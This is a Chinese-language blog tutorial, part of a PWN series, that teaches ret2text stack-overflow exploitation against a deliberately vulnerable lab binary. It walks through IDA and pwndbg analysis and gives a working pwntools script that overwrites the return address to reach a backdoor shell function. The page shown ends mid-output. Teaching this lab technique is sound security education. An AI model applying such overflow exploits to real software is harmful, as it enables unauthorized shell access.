<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='诶，我从你家后门进去了哦～'><title>PWN! PWN! PANG! Part4 --- ret2text</title>

<link rel='canonical' href='https://kira-pgr.github.io/posts/pwn4/'>

<link rel="stylesheet" href="/scss/style.min.4df26095a027ead9be46f67fb83b44e98b34c87d5e891c2bdfb3bfce96b9d54e.css"><meta property='og:title' content='PWN! PWN! PANG! Part4 --- ret2text'>
<meta property='og:description' content='诶，我从你家后门进去了哦～'>
<meta property='og:url' content='https://kira-pgr.github.io/posts/pwn4/'>
<meta property='og:site_name' content='KiraPGR&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='PWN' /><meta property='article:published_time' content='2022-02-10T22:54:20-05:00'/><meta property='article:modified_time' content='2022-02-10T22:54:20-05:00'/><meta property='og:image' content='https://kira-pgr.github.io/posts/pwn4/cover.jpg' />
<meta name="twitter:title" content="PWN! PWN! PANG! Part4 --- ret2text">
<meta name="twitter:description" content="诶，我从你家后门进去了哦～"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://kira-pgr.github.io/posts/pwn4/cover.jpg' />
    <link rel="shortcut icon" href="/img/favicon.png" />

    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/posts/pwn4/">
                <img src="/posts/pwn4/cover_hudfa7423162da6f5e14fd4e8a1ac3231a_749576_800x0_resize_q75_box.jpg"
                        srcset="/posts/pwn4/cover_hudfa7423162da6f5e14fd4e8a1ac3231a_749576_800x0_resize_q75_box.jpg 800w, /posts/pwn4/cover_hudfa7423162da6f5e14fd4e8a1ac3231a_749576_1600x0_resize_q75_box.jpg 1600w"
                        width="800" 
                        height="296" 
                        loading="lazy"
                        alt="Featured image of post PWN! PWN! PANG! Part4 --- ret2text" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/security/" >
                Security
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/posts/pwn4/">PWN! PWN! PANG! Part4 --- ret2text</a>
    </h2>

    
    <h3 class="article-subtitle">
        诶，我从你家后门进去了哦～
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Feb 10, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    3 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    
    
    <h1 id="pwn-pwn-pang-part4">PWN! PWN! PANG! Part4</h1>
<h2 id="必须有的前言">必须有的前言</h2>
<p>从Part4开始我们就要正式进入实战部分了哦qaq,</p>
<p>本篇文章主要讲述最最简单的一种栈溢出利用姿势<strong>ret2text</strong></p>
<h2 id="资料投放__">资料投放&gt;__&lt;</h2>
<ul>
<li>
<p><a class="link" href="https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/EYfbZCQ5bYlNmkY7tEKqHkkB6xhh7qXUlfdzvU1fu_f6jw?e=eOg9Ak"  target="_blank" rel="noopener"
    >IDA Pro 7.5</a></p>
</li>
<li>
<p><a class="link" href="https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Ea4xaVYyrXhGpe-xicuoxJsBGZNUXe3FFg2zpc5tHVYi-A?e=QManqf"  target="_blank" rel="noopener"
    >ret2text题目</a></p>
</li>
</ul>
<blockquote>
<p>P.S. 这里安利一下OneDrive云盘优秀的分享功能，速度快<strong>且可以脱离客户端</strong></p>
</blockquote>
<h2 id="补充知识点linux程序安全保护机制">补充知识点：Linux程序安全保护机制</h2>
<h3 id="aslr-地址随机化技术">ASLR: 地址随机化技术</h3>
<ul>
<li>
<p>全名: Address Space Layout Randomization</p>
</li>
<li>
<p>系统的保护措施, 和程序没有关系, <strong>一般默认目标机器随机化完全开启</strong></p>
</li>
<li>
<p>每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 攻击者无法通过反复试验来了解目标所在，因为每次的地址都会不同。</p>
</li>
<li>
<p>可以通过<code>cat /proc/sys/kernel/randomize_va_space</code>查看系统保护的开启情况</p>
</li>
</ul>
<blockquote>
<p>ASLR选项:</p>
<p>0 关闭</p>
<p>1 半随机 共享库 栈 mmap()分配的堆空间以及VDSO将被随机化</p>
<p>2 全随机 brk()分配的堆空间也被虚拟化</p>
</blockquote>
<h3 id="pie-随机化elf文件映射地址">PIE: 随机化ELF文件映射地址</h3>
<p><del>好饿，想吃馅饼了  雾)</del></p>
<ul>
<li>
<p>全名: Position-Independent Executable</p>
</li>
<li>
<p>程序的防护措施，编译时生效</p>
</li>
</ul>
<blockquote>
<p>检测程序防护措施的方法:PWNTools的checksec模块</p>
<p>详细使用技巧见下文</p>
</blockquote>
<ul>
<li><strong>开启 ASLR 之后，PIE 才会生效</strong></li>
</ul>
<h3 id="the-nx-bitsnx-栈不可执行">The NX bits(NX): 栈不可执行</h3>
<blockquote>
<p>栈为什么要不可执行呢?  <del>小问号你是否有很多小朋友???</del></p>
<p>从前面的知识中可以了解到，攻击者可以通过栈溢出劫持程序执行流，强迫程序执行制定地址的内容</p>
<p>而如果恰好攻击者在栈中写入了shellcode(指执行后可以直接拿到shell的代码)，就可以通过直接执行栈中写入的shellcode来getshell</p>
<p>所以，为了防范攻击者这么轻易就能做坏事= =  <strong>The NX bits</strong>就诞生了</p>
</blockquote>
<ul>
<li>
<p>全名: the No-eXecute bits</p>
</li>
<li>
<p>程序与操作系统的防护措施，编译时决定是否生效(也就意味着可以通过checksec查看)，由操作系统实现</p>
</li>
<li>
<p>实现: 通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃</p>
</li>
</ul>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 191; 
			flex-basis: 458px"
	>
	<a href="/posts/pwn4/NX.png" data-size="965x505">
		<img src="/posts/pwn4/NX.png"
			width="965"
			height="505"
			srcset="/posts/pwn4/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_480x0_resize_box_3.png 480w, /posts/pwn4/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			alt="关于内存中的ELF各部分的权限">
	</a>
	
	<figcaption>关于内存中的ELF各部分的权限</figcaption>
	
</figure></p>
<h3 id="canary-金丝雀--专门针对栈溢出的防护">Canary <del>(金丝雀)</del> : 专门针对栈溢出的防护</h3>
<ul>
<li>
<p>程序的防护措施，编译时生效</p>
</li>
<li>
<p>基本上Canary开启我们就不采用栈溢出的思路</p>
</li>
<li>
<p>实现:在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的</p>
</li>
<li>
<p>canary长度为1字长，其位置不一定与ebp/rbp存储的位置相邻，具体得看程序的汇编操作</p>
</li>
</ul>
<h3 id="relro-重定位信息不可写">RELRO: 重定位信息不可写</h3>
<ul>
<li>
<p>全名: RELocate Read-Only</p>
</li>
<li>
<p>程序的防护措施，编译时生效</p>
</li>
<li>
<p>分为关闭RELRO，部分RELRO(目前是gcc默认), 完全RELRO</p>
</li>
<li>
<p>在本系列文章中不讲解，如果有兴趣可以去看<a class="link" href="https://blog.csdn.net/ylcangel/article/details/102625948"  target="_blank" rel="noopener"
    >这篇文章</a></p>
</li>
</ul>
<h2 id="pwn-pwn-pang">PWN? PWN! PANG!</h2>
<h3 id="前期准备">前期准备</h3>
<ul>
<li>
<p>下载好所需文件(IDA, 目标程序ret2text)</p>
</li>
<li>
<p>在ret2text相同目录下打开终端</p>
</li>
<li>
<p>准备好一个Windows系统</p>
</li>
<li>
<p>确保ret2text文件可以执行</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ll
</span></span><span class="line"><span class="cl">chmod +x ret2text
</span></span></code></pre></div><h3 id="查看保护开启情况">查看保护开启情况</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">checksec ret2text
</span></span></code></pre></div><blockquote>
<p>至于checksec用法嘛= =    checksec 文件名</p>
</blockquote>
<p>结果</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/kali/Sec/PWN/Stack/ret2text&#39;</span>
</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
</span></span><span class="line"><span class="cl">    Stack:    No canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</span></span></code></pre></div><p>可以看见这是一个32位程序，开启了NX</p>
<h3 id="反汇编分析">反汇编分析</h3>
<p>因为IDA是win平台的，所以我们就得先请出一只无辜的Windows</p>
<p>将ret2text拖到 <code>ida.exe</code> 上打开</p>
<blockquote>
<p>如果是64位程序，则选择 <code>ida64.exe</code></p>
</blockquote>
<p>同意使用协议</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 88; 
			flex-basis: 213px"
	>
	<a href="/posts/pwn4/l.png" data-size="538x605">
		<img src="/posts/pwn4/l.png"
			width="538"
			height="605"
			srcset="/posts/pwn4/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_480x0_resize_box_3.png 480w, /posts/pwn4/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			alt="协议">
	</a>
	
	<figcaption>协议</figcaption>
	
</figure></p>
<p>选择第一个(默认配置)然后ok</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 127; 
			flex-basis: 307px"
	>
	<a href="/posts/pwn4/1.png" data-size="581x454">
		<img src="/posts/pwn4/1.png"
			width="581"
			height="454"
			srcset="/posts/pwn4/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_480x0_resize_box_3.png 480w, /posts/pwn4/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			alt="嘛= =">
	</a>
	
	<figcaption>嘛= =</figcaption>
	
</figure></p>
<p>双击左栏main进入主函数</p>
<blockquote>
<p><strong>TIP:  如你界面和我不相同请按空格键切换</strong></p>
</blockquote>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 201; 
			flex-basis: 482px"
	>
	<a href="/posts/pwn4/main.png" data-size="1602x797">
		<img src="/posts/pwn4/main.png"
			width="1602"
			height="797"
			srcset="/posts/pwn4/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_480x0_resize_box_3.png 480w, /posts/pwn4/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			alt="主函数的反汇编">
	</a>
	
	<figcaption>主函数的反汇编</figcaption>
	
</figure></p>
<p>汇编看着太难受了? 按下F5即可看到c代码</p>
<blockquote>
<p><strong>Tip: 别忘了Fn键哦.qaq</strong></p>
</blockquote>
<h3 id="思路分析">思路分析</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Have you heard of buffer overflow?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">vulnerable</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;It seems that you know nothing about it ......&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>我们看到它调用了一个vulnerable函数  <strong><del>(这也太明显了吧 = = )</del></strong></p>
<p>查看那个 <del>欠揍的函数</del> 代码，可以看见明显的一个漏洞</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">vulnerable</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [esp+8h] [ebp-10h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>它使用<code>gets()</code>读入局部变量<code>buffer[8]</code>,由于<code>gets()</code>不检查输入长度，所以就可以读入过长数据造成栈溢出</p>
<p>仔细观察左侧函数列表，<code>get_shell()</code>引起了我们的注意</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_shell</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>好家伙，直接双手呈上shell= =,</p>
<p>这看起来是某个程序员为了方便自己 <del>奇奇怪怪的意图</del> 调试程序干的&lt;好&gt;事, 在程序了直接留下一个后门</p>
<p>现在我们的思路应该很清晰了，就是通过栈溢出篡改函数返回地址，劫持程序执行流，让其调用<code>get_shell()</code></p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 177; 
			flex-basis: 426px"
	>
	<a href="/posts/pwn4/s.png" data-size="986x555">
		<img src="/posts/pwn4/s.png"
			width="986"
			height="555"
			srcset="/posts/pwn4/s_hu9786b2549c7d9b9bfe806264788a882a_29606_480x0_resize_box_3.png 480w, /posts/pwn4/s_hu9786b2549c7d9b9bfe806264788a882a_29606_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			alt="把思路用图片的形式解释下吧.qaq">
	</a>
	
	<figcaption>把思路用图片的形式解释下吧.qaq</figcaption>
	
</figure></p>
<h3 id="精心构造恶意数据">精心构造恶意数据</h3>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 209; 
			flex-basis: 503px"
	>
	<a href="/posts/pwn4/of.png" data-size="877x418">
		<img src="/posts/pwn4/of.png"
			width="877"
			height="418"
			srcset="/posts/pwn4/of_hu265d6c91663920ba0b132793828898e6_26788_480x0_resize_box_3.png 480w, /posts/pwn4/of_hu265d6c91663920ba0b132793828898e6_26788_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			alt="栈溢出发生时栈帧的情况(32位程序)">
	</a>
	
	<figcaption>栈溢出发生时栈帧的情况(32位程序)</figcaption>
	
</figure></p>
<p>既然要溢出，那么我们要溢出多少才可以呢？</p>
<p>观察上面的图片,我们可以发现，我们首先要用垃圾数据把局部变量空间(因具体情况而定)和<code>prev ebp</code>的空间(32位4字节.64位8字节)填满，<strong>然后再加上<code>get_shell()</code>的地址覆盖返回地址</strong></p>
<hr>
<p>计算所需垃圾数据长度方法</p>
<ul>
<li>通过IDA的注释获取(不一定准确)</li>
</ul>
<p>在IDA对于受害者函数的反编译代码中，有这样一句</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [esp+8h] [ebp-10h] BYREF
</span></span></span></code></pre></div><p>可以看到buffer[8]距离<code>prev ebp</code>有16字节的距离，由于我们还需填充<code>prev ebp</code>,我们还要填充4字节的垃圾数据，一共20字节垃圾数据</p>
<ul>
<li>通过pwndbg动态调试</li>
</ul>
<pre tabindex="0"><code>gdb ret2text
</code></pre><p>由于我们要溢出的地方在函数<code>vulnerable()</code>,我们直接在那个地方打断点</p>
<pre tabindex="0"><code>b vulnerable
</code></pre><p>现在开始调试该程序</p>
<pre tabindex="0"><code>r
</code></pre><p>一直下一步直到输入(虽说本次只需要一次)</p>
<pre tabindex="0"><code>n
</code></pre><p>输入8个A测试一下</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 184; 
			flex-basis: 443px"
	>
	<a href="/posts/pwn4/n.png" data-size="1145x620">
		<img src="/posts/pwn4/n.png"
			width="1145"
			height="620"
			srcset="/posts/pwn4/n_huc568db901354378ff555ada67fedb758_589868_480x0_resize_box_3.png 480w, /posts/pwn4/n_huc568db901354378ff555ada67fedb758_589868_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			alt="AAAAAAAA">
	</a>
	
	<figcaption>AAAAAAAA</figcaption>
	
</figure></p>
<p>输入stack 大小(这个大小随意，最好大一些) 查看栈的情况</p>
<pre tabindex="0"><code>stack 40
</code></pre><p>结果</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; stack <span class="m">40</span>
</span></span><span class="line"><span class="cl">00:0000│ esp 0xffffd070 ◂— 0x1
</span></span><span class="line"><span class="cl">01:0004│     0xffffd074 —▸ 0x80483e0 <span class="o">(</span>_start<span class="o">)</span> ◂— xor    ebp, ebp
</span></span><span class="line"><span class="cl">02:0008│ eax 0xffffd078 ◂— <span class="s1">&#39;AAAAAAAA&#39;</span>
</span></span><span class="line"><span class="cl">03:000c│     0xffffd07c ◂— <span class="s1">&#39;AAAA&#39;</span>
</span></span><span class="line"><span class="cl">04:0010│     0xffffd080 —▸ 0x8048600 <span class="o">(</span>__libc_csu_init+32<span class="o">)</span> ◂— dec    dword ptr <span class="o">[</span>ebp - 0xfb7d<span class="o">]</span>
</span></span><span class="line"><span class="cl">05:0014│     0xffffd084 —▸ 0x804a000 <span class="o">(</span>_GLOBAL_OFFSET_TABLE_<span class="o">)</span> —▸ 0x8049f0c <span class="o">(</span>_DYNAMIC<span class="o">)</span> ◂— 0x1
</span></span><span class="line"><span class="cl">06:0018│ ebp 0xffffd088 —▸ 0xffffd098 ◂— 0x0
</span></span><span class="line"><span class="cl">07:001c│     0xffffd08c —▸ 0x80485ae <span class="o">(</span>main+93<span class="o">)</span> ◂— sub    esp, 0xc
</span></span><span class="line"><span class="cl">08:0020│     0xffffd090 —▸ 0xffffd0b0 ◂— 0x1
</span></span><span class="line"><span class="cl">09:0024│     0xffffd094 ◂— 0x0
</span></span><span class="line"><span class="cl">0a:0028│     0xffffd098 ◂— 0x0
</span></span><span class="line"><span class="cl">0b:002c│     0xffffd09c —▸ 0xf7dd9905 <span class="o">(</span>__libc_start_main+229<span class="o">)</span> ◂— add    esp, 0x10
</span></span><span class="line"><span class="cl">0c:0030│     0xffffd0a0 ◂— 0x1
</span></span></code></pre></div><p>可以看到A们在地址<code>0xffffd078</code>,而<code>prev ebp</code>的地址是<code>0xffffd088</code></p>
<blockquote>
<p>Tip: 0x表示16进制</p>
<p>为什么计算机中的东西是用二进制表示的，这里显示16进制呢？</p>
<p>那是因为二进制串实在太长了，不方便查看(0b11111111111111111101000001111000)  = =</p>
</blockquote>
<p>由于前面一长串f都是一样的，我们只需要计算 <strong><code>0x88-0x78+0x4</code></strong> 就可以了(加上0x4是因为要填充 <code>prev ebp</code></p>
<blockquote>
<p>再来个Tip: 每种地址都有一定特点</p>
<p>比如说: 栈里的地址都很大，一边都是0xffff&hellip;</p>
</blockquote>
<p>所以共填充20字节垃圾数据</p>
<hr>
<p>获取<code>get_shell()</code>地址</p>
<ul>
<li>从IDA里找</li>
</ul>
<p>点击左侧函数列表里的函数，然后复制右侧窗口里的那个值</p>
<blockquote>
<p>Tip: IDA是个懒家伙，那个值默认是16进制，但它没有加上前缀0x, <strong>使用这个值的时候自行加上</strong></p>
</blockquote>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 246; 
			flex-basis: 592px"
	>
	<a href="/posts/pwn4/addr.png" data-size="1603x649">
		<img src="/posts/pwn4/addr.png"
			width="1603"
			height="649"
			srcset="/posts/pwn4/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_480x0_resize_box_3.png 480w, /posts/pwn4/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			alt="get_shel1()地址">
	</a>
	
	<figcaption>get_shel1()地址</figcaption>
	
</figure></p>
<ul>
<li>利用PWNTools</li>
</ul>
<p>别忘了python导入模块</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kira㉿kali<span class="o">)</span>-<span class="o">[</span>~/Sec/PWN/Stack<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python                 
</span></span><span class="line"><span class="cl">Python 3.9.10 <span class="o">(</span>main, Jan <span class="m">16</span> 2022, 17:12:18<span class="o">)</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>GCC 11.2.0<span class="o">]</span> on linux
</span></span><span class="line"><span class="cl">Type <span class="s2">&#34;help&#34;</span>, <span class="s2">&#34;copyright&#34;</span>, <span class="s2">&#34;credits&#34;</span> or <span class="s2">&#34;license&#34;</span> <span class="k">for</span> more information.
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; from pwn import *
</span></span></code></pre></div><p>加载该ELF文件信息</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2text&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>寻找<code>get_shell()</code>函数地址</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;get_shell&#34;</span><span class="p">]</span>
</span></span></code></pre></div><p>现在，get_shell变量就保存着<code>get_shell()</code>函数地址了</p>
<hr>
<h3 id="exploit">Exploit!</h3>
<p>呼～终于到了攻击的时候</p>
<p>攻击前，先运行程序试一试</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./ret2text
</span></span></code></pre></div><p>输入可以随便写点什么(我这里写一个A)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kira㉿kali<span class="o">)</span>-<span class="o">[</span>~/Sec/PWN/Stack<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ./ret2text                       
</span></span><span class="line"><span class="cl">Have you heard of buffer overflow?
</span></span><span class="line"><span class="cl">A 
</span></span><span class="line"><span class="cl">It seems that you know nothing about it ......
</span></span></code></pre></div><p>嘛。。这小程序说我们不会缓冲区溢出。。现在就证明给它看我们会！（</p>
<p>先建一个攻击脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">vi exp_ret2text.py
</span></span></code></pre></div><p>第一件事情嘛= =，当然是导入pwntools模块</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span></code></pre></div><p>然后就是基本操作</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2text&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span></code></pre></div><p>构造payload(要输入的东西，也就是垃圾数据和我们想要程序返回的地址)</p>
<p>如果你用IDA取地址(不建议)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048522</span><span class="p">)</span>
</span></span></code></pre></div><p>如果你用pwntools取地址(你可以直接在编写脚本的时候取地址)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2text&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbol</span><span class="p">[</span><span class="s2">&#34;get_shell&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_shell</span><span class="p">)</span>
</span></span></code></pre></div><p>最后，把恶意数据喂给程序 <del>唔哈哈哈哈;)</del></p>
<p>就能尽情享用得到的shell了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="运行攻击脚本">运行攻击脚本</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 exp_ret2text.py
</span></span></code></pre></div><p>过程展示</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kira㉿kali<span class="o">)</span>-<span class="o">[</span>~/Sec/PWN/Stack<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 exp_ret2text.py                                                       
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./ret2text&#39;</span>: pid <span class="m">897972</span>
